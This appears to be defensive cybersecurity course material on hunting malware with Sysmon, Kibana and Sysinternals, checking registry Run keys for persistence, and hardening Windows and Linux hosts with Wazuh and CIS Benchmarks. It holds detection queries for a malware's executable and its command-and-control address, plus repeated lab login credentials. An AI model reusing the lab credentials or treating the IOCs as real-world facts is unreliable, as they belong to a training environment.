Make note of the registry keys being added here, shown in Figure 24.2-5 below. These entries represent an IOC that can be searched for later. Make note of the file path to the executable being set in these entries.

<img width="1820" height="640" alt="image" src="https://github.com/user-attachments/assets/2eadfe3e-9994-4a47-97dd-8399ffd95398" />

Figure 24.2-5


13. Open the Process Monitor Filter window by selecting Filter, and then select Filter again.


14. Select the Operation is RegSetValue entry. 


15. Select Remove.


16. Create a new filter. Set the Process Monitor Filter values to Operation is TCP Connect.


17. Select Add, and then select OK. 


These entries correlate to the connections observed in Wireshark. The malware pl.exe is creating the connection on port 1337.


Use the IOCs obtained from this workflow to answer the following questions.

<img width="887" height="460" alt="image" src="https://github.com/user-attachments/assets/03b59d46-be82-44a2-8d40-bffdfcca3da1" />

<img width="1093" height="735" alt="image" src="https://github.com/user-attachments/assets/773e75e1-d646-45bb-a707-eb8de92920ea" />


----------------

Suspicious Host Activity and Elastic Stack
Discovering malware-related IOCs on one host provides information that can be used to search for similar compromises on other hosts. 

﻿

The presence of a Security Information and Event Management (SIEM) solution enhances an analyst’s ability to hunt for threats across a network from a single console instead of doing so manually. A SIEM collects and displays both real-time and historical host system logs for query by a Host Analyst.

﻿

Querying Malware-Related IOCs
﻿

Presuming that host machines on a network are shipping detailed system and event logs to the Elastic Stack, a Host Analyst has the opportunity to perform queries for malware-related IOCs discovered on a known compromised host.

﻿

Scenario 
﻿

If a malicious executable with the name s3Ummo.exe is discovered on one host, then other hosts on the network may be compromised by the same malware as well. A query for the transfer of a file named s3Ummo.exe may produce a number of logs associated with the known compromised host, as well as other hosts that received the file. Additional types of IOCs can be searched for, such as open network ports on a host. 

﻿

Presuming that s3Ummo.exe establishes communication to a specific external IP address on a compromised system, a query for either the specific port number or external IP address can return logs from other systems on the network that may be compromised. 

﻿

If the process associated with s3Ummo.exe is known to spawn several child processes when a compromise is successful, a query can be created to find similar processes on other hosts. This information can be used to determine if s3Ummo.exe was executed and if sub-processes were spawned as a result of a successful exploitation.

﻿

Queries and Data
﻿

The quality of queries from a SIEM is dependent on the collected data (host logs). If hosts are not configured to send verbose logs, if there is a significant delay in the sending of logs, or if the host does not perform logging at all, then the ability to query with a SIEM is limited.

﻿

Threat Hunt Hypotheses
﻿

Malware-related IOCs can be used to distinguish malware threat behavior. Additionally, malware threat behavior allows a Host Analyst to make assumptions regarding the overall goal of the attacker who delivered the malware. For example, the establishment of a backdoor remote shell on a compromised host is an opportunity for an attacker to perform reconnaissance on user activity on the host. From there, hypotheses form and evolve as the hunt progresses. 

﻿

Scenario
﻿

Presume that a host is compromised by a malicious file named s3Ummo.exe. Analysis of the host reveals that this program established a connection to an external IP address. Shortly afterward, two additional files appear on the compromised system, AcWin.dll and crmlog.dll. 

﻿

Initial Hypothesis
﻿

With the details available thus far, the Host Analyst forms the following initial hunt hypothesis:

A host has been compromised, potentially by the malicious file s3Ummo.exe, resulting in the delivery of additional malware. 
The additional malware files may be AcWin.dll and crmlog.dll.
Threat Hunt Progression
﻿

Initial triage of the compromised system does not associate any malware activity with either of these files, but their presence is cataloged as IOCs.

﻿

A threat hunt using IOCs from the above malware activity results in the discovery of two more compromised systems. The two compromised systems display additional suspicious internet activity and malicious behavior, like the installation of a keylogger on one system, and a network scanner on the other. 

﻿

Analysis of the original compromise confirms suspicious Hypertext Transfer Protocol Secure (HTTPS) activity not previously discovered, but no additional malicious activity is detected.

﻿

Refined Hypothesis
﻿

After analysis of the AcWin.dll and crmlog.dll files, it is determined that the files are used to reflectively load code into a process to conceal the execution of malicious payloads. This allows for command and control communications to external domains over HTTPS. 

﻿

Since the results of these communications are different on each of the three compromised hosts, it is concluded that the malicious behavior is likely performed by a remote attacker providing different commands to each host.

﻿

Working Hypothesis
﻿

When s3Ummo.exe was discovered on the first compromised host, it was not apparent that additional malicious behavior was coming from a result of the additional files AcWin.dll and crmlog.dll.

﻿

The Host Analyst first supposed that the malware and IOC behavior suggested the scope of the malicious activity was limited to the network activity involving the s3Ummo.exe process, and that the other artifacts were used to support the execution of s3Ummo.exe.

﻿

After examination of two other compromised hosts, the Host Analyst arrives at the following working hypothesis:

Given the new information, the original hypothesis must be expanded to include additional command and control activity over the encrypted HTTPS protocol. 
The adversary is capable of remaining persistent and can execute additional commands at any time. 
After a threat hypothesis is formed, it evolves as new information is gathered. Eventually, decisions need to be made for the hunt to progress. In this scenario, initial assumptions evolved into a working hypothesis that allowed the Host Analyst to conduct the hunt.

﻿

The attack chain is illustrated in Figure 24.2-6 below:

<img width="1667" height="1547" alt="image" src="https://github.com/user-attachments/assets/83bb27f0-12d6-4c17-943d-ff60f890a1ee" />


-----------------


Identify Suspicious Hosts
Use the IOCs gathered in previous workflows to identify hosts that need further examination. In the provided network, a Security Onion instance is configured to ingest data from hosts on the network. 

﻿

Discover suspicious hosts using Kibana to analyze events generated by Sysmon. Data for the attack is estimated to be present between December 20, 2022 and December 22, 2022.

﻿

Workflow 
﻿

1. Log in to win-hunt VM with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome.

﻿

3. Select the Discover Elastic bookmark.

﻿

4. Log in using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Set the date range to December 20, 2022 @ 00:00:00.000 to December 23, 2022 @ 00:00:00.000.

﻿

6. Select Update. 

﻿

7. Enter the following query to find instances of pl.exe being executed:

process.executable: *pl.exe
﻿

As seen in Figure 24.2-7 below, the  agent.name  field communicates to the computer on which this event was generated. Make note of all computers that are present in the results.

﻿
<img width="2048" height="1146" alt="image" src="https://github.com/user-attachments/assets/f888a234-4106-4370-ae49-91969887049f" />

8. Enter the following query to find instances of pl.exe creating files:
file.target: pl.exe and event.action: *FileCreate*


<img width="2048" height="1166" alt="image" src="https://github.com/user-attachments/assets/f35319ce-4114-47df-b1e4-80c320dd233c" />


9. Enter the following query to find connections to the malicious IP:
destination.ip: 199.63.64.51 and destination.port:1337



10. Use the attached hosts.pdf file to cross-reference the client.ip field and determine the hosts involved.


Use these results to answer the following question.

<img width="1051" height="594" alt="image" src="https://github.com/user-attachments/assets/bddb14f8-48df-4807-b045-8f388d3363ea" />



------------------------


Host Threat Hunt Tools
Once a suspicious host has been identified during a threat hunt, a Host Analyst must perform analysis of the host and gather evidence.

﻿

Presume that a host compromised by malware has been identified on a network. Analysis of the infected system reveals several IOCs related to the following: 

Network communications
Registry key modifications
File system changes
This suggests the potential for an attacker to achieve unauthorized remote access. Of these IOCs, a few have been found in additional systems according to a search in Elastic.

﻿

The discovery of a positive match for an identified malware-related IOC on a host separate from a known compromised system does not necessarily imply that an additional compromise has occurred. Depending on the nature of the IOC, potential exists for false positives if the IOC is too generic.

﻿

For example, one malware may attempt to connect to Google’s public DNS server in order to translate a command and control domain to an IP address to establish a connection. This connection attempt to Google’s DNS may be identified as an IOC. 

﻿

However, if benign software on a host also uses Google’s DNS, then the identification of this IOC would not be sufficient to establish that the same host was compromised. Instead, these IOCs must be used in conjunction with evidence available on a host to make an informed decision on whether or not incident response actions are required.

﻿

Sysinternals Suite
﻿

The Sysinternals suite makes the process more efficient than native Windows tools. The ability to search for known IOCs and behavior discovered from logs shipped to a SIEM are provided by Sysinternals.

﻿

In this scenario, use of the Sysinternals suite leads to the discovery of additional evidence on a suspicious host to help corroborate malware-related IOCs. Process Monitor, TCPView, and Autoruns help when searching for the IOCs discovered through Elastic queries. 

﻿

If the IOC discovered involved communication to Google’s DNS, the process that performed this connection should be examined by the Host Analyst. Further analysis can be performed to discern additional threatening behavior. 

﻿

Much of this additional information may be available in a SIEM such as Elastic if Sysmon is installed on the hosts and detailed logs are sent. However, these detailed Sysmon logs may be too large for a SIEM to ingest on an enterprise network. Thankfully, Sysmon logs are available in Microsoft Event Viewer.

﻿

A deeper understanding of a malware threat can be achieved through correlating IOCs discovered on hosts with application behavior to determine the existence of a threat on the host. This allows for a more informed evaluation of a potential threat and limits the potential number of false positives when threat hunting.


-------------

Malware Threat Hunt
A malware threat hunt is triggered by the observation of one or more hosts exhibiting signs of a potential malware compromise. The existence of a potentially compromised system is discovered through analysis of host logs that match known malicious behaviors. 

﻿

These malicious behaviors are informed by threat intelligence and malware-related IOCs discovered on hosts positively identified as victims of a malware compromise.

It is important to distinguish between threat hunting and incident response. Malware threat hunting is proactive, aiming to identify and mitigate potential threats before they cause harm, whereas incident response is reactive, focusing on rapid detection, containment, and mitigation of incidents once they have occurred.﻿

﻿

Preparing for a Malware Threat Hunt
﻿

Before beginning malware threat hunting activities, the Host Analyst should attempt to understand the behavior associated with a set of malware-related IOCs. Understanding the relationship between IOCs and malware behavior informs the analyst as to what additional host activities may be related to a potential malware compromise. 

﻿

For example, a malware IOC involving host activity regarding a change to one Windows Registry key used for persistence may mean that additional keys used for the same purpose may be modified on other hosts compromised by malware. Without an understanding that the registry key change identified as an IOC was used by malware to establish persistence, the Host Analyst may not have a reason to include similar registry key changes in the threat hunt.

﻿

Beginning a Malware Threat Hunt
﻿

The malware threat hunt starts by searching for IOCs using a SIEM, such as the Elastic Stack. Logs from multiple hosts are ingested by Elastic, providing the Host Analyst with the ability to query these logs and use dashboards to aid in the hunt. If there are any positive matches for the malware-related IOCs (or any other related suspicious activity is discovered in the process) then the hosts displaying this behavior are recorded for additional analysis on the host.

﻿

Host-based malware threat hunting involves using tools, such as the Sysinternals suite, to take a deep dive into the events surrounding the identified suspicious activity. This involves correlating the observed IOC-related behavior to other events on the system. 

﻿

Conducting the Malware Threat Hunt
﻿

If one or more suspicious registry key changes have been made, determining what time this occurred is important for identifying a suspicious process. 

﻿

The malware threat hunt is conducted with the following goals established:

Discover system changes consistent with a potential malware compromise

Verify that the changes correspond to malware-related IOCs

Determine whether or not a host is compromised

With the suspicious process identified, the executable program associated with that process can be searched for text strings.


--------------


Malware Threat Hunt, Host 1
Validating Findings
﻿

Through the use of Kibana queries, the hosts ls-wkstn-3 and bp-wkstn-3 have been identified as potentially compromised. Explore the hosts, validate these findings, and determine the state of the hosts. Begin with ls-wkstn-3.

﻿

Workflow 
﻿

1. Log in to the ls-wkstn-3 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Using File Explorer, navigate to the following path to search for the malicious payloads:

C:\Users\trainee\AppData\Roaming\UserApps\
C:\Users\trainee\AppData\Local\Temp\
﻿

3. Verify whether the file pl.exe is present.  

﻿

4. Open Registry Editor.

﻿

5. Navigate to the indicated registry path:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
﻿

6. Determine if the Service value is present and referring to the malicious payload.

﻿

7. Repeat Step 5 and Step 6 for the following paths:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

<img width="1119" height="560" alt="image" src="https://github.com/user-attachments/assets/c94eeecb-a970-4af9-aa8a-922f22ce3a02" />

 
-----------------


Malware Threat Hunt, Host 2
Validating Findings
﻿

Evaluate the next host, bp-wkstn-3, and determine the current state of the machine.

﻿

Workflow
﻿

1. Log in to the bp-wkstn-3 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open File Explorer and navigate to the following paths to search for the malicious payloads:

C:\Users\trainee\AppData\Roaming\UserApps\
C:\Users\trainee\AppData\Local\Temp\
﻿

3. Verify whether the file pl.exe is present. 

﻿

4. Open Registry Editor.

﻿

5. Navigate to the following registry path:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
﻿

6. Determine if the Service value is present and referring to the malicious payload.

﻿

7. Repeat Step 5 and Step 6 for the following paths:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
 
<img width="1132" height="644" alt="image" src="https://github.com/user-attachments/assets/5f764984-5b60-4ee8-b48b-f5ceccd7e8a3" />

reg query <HKEY> /f ".exe" /s

-------------

### CDAH-M25L1-Understanding Host Operating System Hardening Requirements ###


Operating System Hardening
Workstations and servers typically arrive from a vendor with the default settings and software set up on them. Attackers know this and look for typical vulnerabilities that arise from keeping a system with the default configuration. A brand new system may come with software that is not used or settings that allow administrative privileges to nonadministrative users. 

﻿

OS hardening is the process of implementing security measures and patching of an OS with the objective of protecting systems. This may include removing unnecessary software, removing used default accounts or default administrative accounts, or disabling or removing unnecessary services. 

﻿

Default Programs and Features of an OS
﻿

Default configurations on a system are often less strict than needed. Many times, they have unnecessary services and software running and can present a security risk to organizations. Each program that is not used but still enabled can be used by an attacker to compromise a system. Any program that is not essential for the user to complete their job or not necessary to run the OS should be removed. There are also default services that are not necessary to run the OS that can have known or unknown vulnerabilities and should be disabled as well. 

﻿

Other benefits to disabling and removing any unnecessary programs and features exist, such as less storage requirements or less power consumption. If it is unknown whether a feature is required, administrators should disable the feature until its necessity arises. For example, on newer versions of Windows, the AutoPlay feature for removable media and devices is enabled by default. This feature should be disabled to prevent any potentially malicious files from automatically opening when a Universal Serial Bus (USB) device is connected. 

﻿

Using attacker Tactics, Techniques, and Procedures (TTP), an analyst can implement security settings that mitigate the risk of a successful attack. Features also exist that can be enabled to harden a system. Audit policies should be enabled to ensure that any malicious activity or authentication attempts are logged. OS hardening is primarily focused on enforcing preventative measures, but by enabling the logging of user activity on a system, analysts can review trends or activity that may be malicious. 

﻿

OS Hardening Best Practices
﻿

Although each OS has its own unique characteristics and specific items with each OS need to be addressed, several hardening best practices can be used across all OSs.

﻿

OS Updates
﻿

One of the easiest steps analysts can take to harden an OS is to keep all programs up to date and on the latest version. Security updates are often released to patch a vulnerability within the OS. Vendors may release urgent patches if a piece of software has recently been publicly exploited and led to a cyber attack. Attackers look for systems that have a version with known vulnerabilities to exploit that system.

﻿

Organizations should create a patch management plan to ensure that all of the OSs and programs on the systems are always up to date. When a security patch is installed to fix a vulnerability, a consistent and repeatable process should be followed to ensure that all systems and programs are updated. Having a patch management plan ensures that all patches are reviewed, tested, and validated prior to their implementation.    

﻿

Secure Configuration
﻿

Also for effective OS hardening, analysts should secure the configuration of the system. This is one of the most burdensome steps of hardening the system, but it is essential. 

﻿

Analysts should start by removing any unnecessary programs to reduce the attack surface. Any program that exists on a system can be used as an entry point for an attacker, so programs that are not essential should be removed. Organizations should also create a policy that no software should be installed on a system unless it has been reviewed and approved by the appropriate organizational area.

﻿

Next, analysts should set up access control using the principle of least privilege. Access to files, programs, and other resources should be restricted for administrators and nonadministrators by evaluating access to those files and folders individually. Individuals should be given access to only files and folders essential to complete their daily tasks. 

﻿

Shared accounts create an issue with accountability and should not be used under any circumstance. Default accounts should be assessed for relevance. If any accounts are deemed essential for maintenance or management, the default passwords should be changed to more secure passwords. Multi-Factor authentication should be used for any default accounts.

 

Creation of group policies is another step that may be taken. Administrators should assign users to specific groups and ensure that each group has strict privileges to limit the damage that could be done if a system or account is compromised. Any groups that are used should be regularly checked to ensure that the users who exist in those groups still require access to the files or folders that the groups grant them access to. 

﻿

For Windows systems, security templates can be used to configure a broad scope of settings on multiple systems. Security templates can be used to configure a broad range of security-related settings on Windows machines, such as a password policy, audit policy, event log settings, or system authorization settings. Using group policy security templates can be imported and configured across a domain so that all of the systems that exist on the domain have the same security settings configured. 

﻿

Additional Security Measures
﻿

Endpoint protection is an added security measure that should be applied to systems. Endpoints are an increasingly common route of entry for attackers, and an added layer of protection can help to keep systems secure and free from a breach. Windows comes with Windows Defender as an endpoint protection solution by default. Other endpoint protection software solutions may also be used for detecting, or alerting analysts of, malicious behavior found on an endpoint.  

﻿

Another added security measure is to keep sensitive databases or applications segregated in their own containers or Virtual Machines (VM). This also ensures that in the event of a compromise, the organization’s sensitive data is not compromised or stolen. Applications can be isolated to their own VMs or containers, and network access to those machines can be restricted. In this way, if an attacker takes control of one application, they cannot access another, reducing the damage that can be done to the overall network.    

﻿

Further Resources and Guidance
﻿

Organizations use other resources and tools for guidance in configuring systems to be more secure. Two popular resources to help with hardening a system are CIS Benchmarks™ and DISA STIGS.

﻿

CIS Benchmarks
﻿

CIS Benchmarks, published by the Center for Internet Security® (CIS), are globally recognized documented industry best practices that can be used to securely configure Information Technology (IT) systems, software, and networks. CIS offers more than 100 configuration guidelines across more than 25 different vendor products. These guidelines can be used proactively to help organizations safeguard against continuously emerging risks. Companies can use the benchmark guidelines to configure their systems with a secure baseline and then continue to harden their systems to meet the organization’s needs.   

﻿

DISA STIGS
﻿

Security Technical Implementation Guides (STIG) are configuration standards developed by the Defense Information Systems Agency (DISA). Similar to CIS Benchmarks, they are designed to make device hardware and software as secure as possible to safeguard networks and data from cyber criminals. The U.S. Department of Defense (DoD) requires that any organizations that are a part of the DoD or that connect to DoD networks comply with any STIGs applicable to the software or hardware that the organization uses. Currently, hundreds of STIGs are designed for specific software, routers, OSs, and other devices.

﻿<img width="1124" height="761" alt="image" src="https://github.com/user-attachments/assets/3b2020a4-f3a8-42c6-84a9-bdabe1872ee5" />

----------------

Hardening Implementation
Many levels of hardening are available, and organizations must determine how far they need to go to achieve adequate security for their environment. Implementing hardening controls is a balance between too much security or too many restrictions and not enough security or restrictions to secure the device in question. 

﻿

Sometimes controls implemented seem to be overdoing security. An example is using a 14-character password on a non-internet facing server for protection from attackers, as a system user may have difficulty remembering an extremely long or complicated password. Another example is using unnecessary controls that slow down production. An organization must determine which set of controls is truly necessary through an audit of computer systems. Such an audit shows where the gaps are and how much hardening must be performed to be compliant with the organization’s industry. The level of hardening required is also dependent on the amount of risk that the organization accepts or will willingly implement mitigation controls for.

﻿

Depending on the industry an organization is in, the organization may have to comply with industry standards in order to carry out business. Selecting the right hardening/auditing requirements depends on the industry and laws surrounding an organization. The CIS Benchmarks show that dozens of hardening controls are available for each OS, and it may seem overwhelming to determine which to implement. When possible, companies should align their goals with the compliance requirements they may need, such as becoming Payment Card Industry (PCI) compliant so that the business can support credit card transactions. This can help companies create a scope for which controls need to be implemented.

﻿

PCI DSS
﻿

The Payment Card Industry Data Security Standard (PCI DSS) is a global standard that applies to any business that accepts, processes, stores, transmits, or impacts the security of cardholder data. PCI DSS has strict requirements regarding how credit card information must be handled, and that goes hand in hand with hardening controls. A common hardening control is to limit the number of users that can access the PCI DSS information, which can be accomplished on an endpoint device by using security groups or limiting user accounts on the system.

﻿

HIPAA
﻿

Health Insurance Portability and Accountability Act (HIPAA) compliance ensures that companies that access, process, or store protected health information follow best practices for keeping this highly sensitive data secure. A common security control for HIPAA is to enable hard disk encryption, which can be remediated by enabling the encryption feature BitLocker so that if a device is lost or stolen, the data is still protected.

﻿

SOC 2®
﻿

SOC 2 is the most sought-after security framework for growing Software-as-a-Service (SaaS) companies. SOC 2 certification demonstrates an organization’s ability to effectively safeguard the privacy and security of customer and client data. SOC 2 requires an organization to have detailed auditing trails, which may be carried out by enabling detailed logging via group policy for Windows systems.

﻿

GDPR
﻿

The General Data Protection Regulation (GDPR) protects the personal data and privacy of individuals in the European Union (EU) and United Kingdom (UK). The GDPR states that processors must ensure that personal data is not used for any purpose other than that for which it was collected. A security control such as disabling write access to USB devices could be a control that partially addresses this requirement but may impact how an organization does business if it relies on USB devices.

﻿

NIST 800-53
﻿

National Institute of Standards and Technology (NIST) Special Publication (SP) 800-53 is a security compliance standard created by the U.S. Department of Commerce and NIST in response to the rapidly developing technological capabilities of national adversaries. It compiles controls recommended by the NIST Information Technology Laboratory (ITL). One of the requirements to be NIST 800-53 compliant is to harden a server so that only software that is digitally signed can be installed on the server. This can be implemented through a CIS control outlined in a CIS benchmark.

﻿

These compliance and hardening standards cannot prevent every cyber attack, but they greatly reduce the attack surface and make becoming a victim of a cyber attack less likely. Each of these compliance and hardening standards focuses on disabling unnecessary applications and services and allows only what the organization requires at a minimum to perform their business without limiting the functionality of those IT systems.

﻿------------

 
Determine OS Hardening Strategy in Windows
The role of the certification and accreditation team is to scan hosts in a network and find which systems have secure configurations and which remain to be modified to reach the acceptance criteria.

﻿

In the following workflow, use the tool Wazuh and the CIS Benchmarks to locate misconfigurations to lead the team toward being able to create a hardening strategy in Windows. (A second workflow using Linux is provided later.)

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome, and select the Discover - Wazuh bookmark.

﻿

3. Log in to Wazuh using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

4. Set the time filter to Sep 12, 2022 @ 00:00:00.000 through Sep 12, 2022 @ 23:30:00.000:


<img width="645" height="80" alt="image" src="https://github.com/user-attachments/assets/40b72a20-977b-4f47-b134-83329a13eeb9" />



5. Enter the following fields, one at a time, for filtering in the Search field names box. For each, hover the mouse over the name of the field and select the blue plus (+) icon to add it to the Results pane:

data.sca.check.description
data.sca.check.result

<img width="296" height="200" alt="image" src="https://github.com/user-attachments/assets/ee69356e-e959-4e85-a8c1-40bfc28edb3d" />


6. Change the query language from Data Query Language (DQL) to Lucene by selecting DQL in the top right corner of the interface and moving the slider in the Syntax Options window to the left:


<img width="2035" height="533" alt="image" src="https://github.com/user-attachments/assets/c8180001-a8dd-412a-b2b2-623a13730f64" />

7. Enter the following in the query search box to locate security controls that have not yet been implemented on this system. These controls are marked as failed because they are recommended but have not been configured.
agent.name:"cda-win-hunt" AND data.sca.check.result:"failed"


<img width="1214" height="225" alt="image" src="https://github.com/user-attachments/assets/33f9d146-0716-4f2e-92d0-672125fcfa62" />


8. Scroll through the list of results to see the items that have not yet been secured.


9. To find a particular control that pertains to the Windows Defender antivirus, run the following query:
agent.name:"cda-win-hunt" AND data.sca.check.result:"failed" AND data.sca.check.description:*PUA*


Only one result should appear. 


10. Expand the result by selecting the greater than (>) symbol. Scroll through the output, and note the following fields:

data.sca.check.description: Explains what the control is.
data.sca.check.rationale: Explains why enabling the control is important.
data.sca.check.remediation: Explains how to enable the control.
data.sca.policy: Shows from which CIS Benchmark this information is being derived.
rule.cis: CIS controls rule Identifier (ID).
rule.gdpr: GDPR rule ID.
rule.nist_800_53: NIST 800-53 rule ID.
rule.pci_dss: PCI DSS rule ID.
rule.tsc: SOC 2 rule ID.

11. Minimize the browser window, and open the attached file, CIS_Microsoft_Windows_10_Enterprise_Benchmark_v1.12.0.pdf.


12. Search the document for PUA (which is an abbreviation for Potentially Unwanted Applications), or go to page 978 of the document.


Page 978 shows the same information in a different format from that found in Wazuh. Wazuh is showing what is not compliant, whereas the CIS Benchmark lists all controls, regardless of whether they have been patched, potentially providing a bit more detail.


From this point, the security team or security auditors can develop a plan to determine which items to prioritize for correction.


The preceding exercise demonstrated how to determine which controls are needed to be implemented and how to locate them. It also showed which resources are available for greater details.


Use this workflow to answer the following question.

<img width="1125" height="683" alt="image" src="https://github.com/user-attachments/assets/5f7c7986-0c42-4a2c-9b13-db9cc58f5e01" />


------------------


Determine OS Hardening Strategy in Linux
In the following workflow, use the tool Wazuh and the CIS Benchmarks to locate misconfigurations to lead the team toward being able to create a hardening strategy in Linux.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome, and select the Discover - Wazuh bookmark.

﻿

3. Log in to Wazuh using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

4. Select the hamburger menu icon, and select Wazuh to open the Modules page:

﻿

<img width="620" height="642" alt="image" src="https://github.com/user-attachments/assets/c1da1707-514b-4de4-91fe-0ec091175a28" />

5. Under Active Agents, select 1 to open the Agents page.


6. Select Ubuntu to open the specific page for the Ubuntu Linux host. The page presents a dashboard of results that Wazuh has found during its scan of the system checking for compliance with the CIS controls benchmark:


<img width="2030" height="859" alt="image" src="https://github.com/user-attachments/assets/ff1ade30-cd39-4a29-b5ca-339aee59b705" />


7. In the SCA: Last scan area, select CIS benchmark for Ubuntu Linux 20.04 LTS.


8. Under Policy, select CIS Benchmark for Ubuntu Linux 20.04 LTS to view all noncompliant events.


9. At the bottom of the page, expand the rows per page from 10 to 50.


10. Filter the list by selecting the Result column so that the arrow points upward, displaying all failed events.


11. Select ID 19024 Disable USB Storage to obtain more information.


Details of this control appear, including why it is a concern, how to remediate it, and which rules this applies to for GDPR, HIPAA, NIST, PCI and SOC 2 compliance. The CIS rule ID is also available and is found in the attached file, CIS_Ubuntu_Linux_20.04_LTS_Benchmark_v1.1.0.pdf.


12. Review other items in the list to become familiar with what is most important to an organization and which controls should be implemented first.


Use this workflow to answer the following question.

<img width="1147" height="606" alt="image" src="https://github.com/user-attachments/assets/b03f9103-5ad2-43bf-a413-fd8c13a8a94d" />

-----------

### CDAH-M25L2-Harden a Host Operating System ###

Operating Systems
To protect a kingdom while also keeping it functional, a leader must be intimately familiar with not only its walls but also its inner workings. The same is true in computer security. This lesson begins by providing basic foundational computing concepts to ensure familiarity with the computer security “kingdom.”

﻿

Every computer comes with special software known as an Operating System (OS): software that allows users to communicate with a device to perform desired functions. The OS is the most important piece of software on any computer. Without an OS, a computer is useless.

﻿

OSs use two components to perform their tasks: the kernel and the shell. The kernel is the inner component that processes data at the hardware level. The kernel handles input–output operations, memory management, and process management. The shell is the outer layer that manages the interaction between the user and the OS.

﻿

The basic functions of an OS include the following:

Booting
Disk and memory management
Data security
Program loading and execution
User Interface (UI)
Process management

OS Types
﻿

OSs usually come installed on the computer hardware on which they run, and they operate in a way according to the needs of the system or users they serve. Many OS types exist, such as the following:

Time-Sharing OS: Enables users located at different terminals to use a single system. 
Real-Time OS: Used when strict time requirements exist for a system. The time interval required to process and respond to input is very small. Real-time OSs are used for such systems as missile systems, air traffic control systems, and robots.  
Network OS: Runs on a server and allows users to manage data, users, groups, and security and to perform other networking functions.  
Distributed OS: Communicates with autonomous interconnected computers using a shared computer network. Each system has its own memory and Central Processing Unit (CPU) and can be accessed remotely from other devices connected to that network. 

The most common workstation OS types used today are Microsoft Windows, macOS, and Linux. For mobile devices, the most common OS types are Android and Apple iOS. The Android OS is based on Linux distributions and other open-source software. Apple iOS is used exclusively for iPhones. 


------------


OS Hardening
System hardening is a process to secure a computer system by eliminating risks of cyber attacks on endpoint devices, such as computers or mobile phones. The process involves removing the points where an unauthorized user might access a system and extract data. OS and application features, sometimes known as the attack surface, often serve as entry points for malicious attacks. Hardening reduces the attack surface by disabling applications and other features that attackers might leverage to gain access. Additional tactics used to harden an OS include installing patches and updates and reducing the number of user accounts allowed to access the OS. OS hardening is especially important in situations in which a system is exposed to above-average security risks, such as a web server or data server that is exposed to the public internet. 

﻿

Attackers are constantly looking for weaknesses to exploit. Any change introduced to a system can cause an OS to become insecure or open new attack vectors. Therefore, the hardening process should be a continuous one. The time required to perform OS hardening is well worth the work, as hardening provides the foundational defenses for any organization’s network.

﻿

Host OS types are varied, as stated earlier, and each host may serve a different purpose on the network. For example, Windows machines are typically used as primary workstations for employees because Windows is more user friendly than Linux. However, Windows OSs are more susceptible to cyber attacks than most Linux distributions. Because Linux is typically more secure and reliable than Windows, Linux is used more often for such tasks as a web server or database server. Each organization has specific reasons for using a given OS, and analysts should consider the server’s purpose and which applications exist on that server when hardening the OS.   

﻿

The attack surface of a web application includes such security vulnerabilities as unpatched software and firmware, unsafe configurations, insecure logins (for example, using hard-coded and default passwords), credentials stored in plaintext, and inadequate data encryption in transit or at rest. 

﻿

Organizations should create a policy with processes to continually check security controls. A checklist can be created for analysts to ensure no task is missed. Analysts should also check the security controls any time a change is made on the network, whether it is the introduction of new software, a new firewall policy created by the organization, or another modification. Any change, no matter how minor, may introduce a vulnerability to the organization. 

﻿

Depending on the type of system being hardened, different steps or tasks may need to be performed on that system. Although all systems include some similar tasks, such as ensuring that security patches are up to date, each system has its own tasks to perform, based on what the system is being used for. The following are examples of hardening tasks that should be performed regularly. 

﻿

Server Hardening
﻿

Server hardening is a process that involves hardening the data, ports, permissions, and specific components of the server based on the OS being used. General server security measures are as follows:


Keep the server OS patched and updated.
Regularly update any third-party software essential to the operation of the server. Any software or service that is not essential should be removed or disabled.
Use strong passwords, and develop a password policy for the users of the server.
Ensure that user accounts are locked out if they exceed a set number of failed login attempts (for example, three attempts). 
Remove any unused accounts.
Disable Universal Serial Bus (USB) ports at boot.
Implement Multi-Factor Authentication (MFA).
Use data encryption to protect any sensitive data on the server.
Use antivirus and firewall software to protect the OS and add a layer of security to the server. 
Software Application Hardening
﻿

Unlike server hardening, software hardening focuses on hardening any applications that exist on a server. Application hardening involves updating application code to ensure that it is secure and adding additional security measures to protect sensitive applications. General software application security measures are as follows:


Keep all OS and third-party applications patched and up to date.
Use a host firewall on the OS to protect the application.
Use antivirus, malware, or endpoint protection software on the application server.
Use encryption to protect sensitive data or sensitive applications.
Use an application that can store and encrypt passwords for servers that store multiple applications. 
Establish an Intrusion Detection System (IDS) and Intrusion Prevention System (IPS).
Database Hardening
﻿

Three primary goals should be accomplished when hardening a database:


Control and limit user privileges and access.
Disable unnecessary database services or functions.
Secure and encrypt database information and resources used.

These goals may be accomplished by using the following techniques:


Restrict administrators and administrative privileges and functions.
Encrypt in-transit and at-rest database information. 
Create access control policies. 
Regularly update and patch database software.
Disable unnecessary database services or functions.
Lock unused database accounts or those with suspicious activity. 
Enforce strong passwords. 


----------------

Implement Security Controls
Scenario: A Windows endpoint was recently compromised by the malware Raspberry Robin. This malware executes as soon as an infected USB drive is plugged in. 

﻿

Complete the steps in the following lab to identify what control must be modified to keep this activity from occurring in the future and to minimize any negative effects.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Google Chrome, and select the Discover - Wazuh bookmark. 

﻿

3. Log in to Wazuh using the following credentials:

Username: trainee
Password: CyberTraining1!




﻿

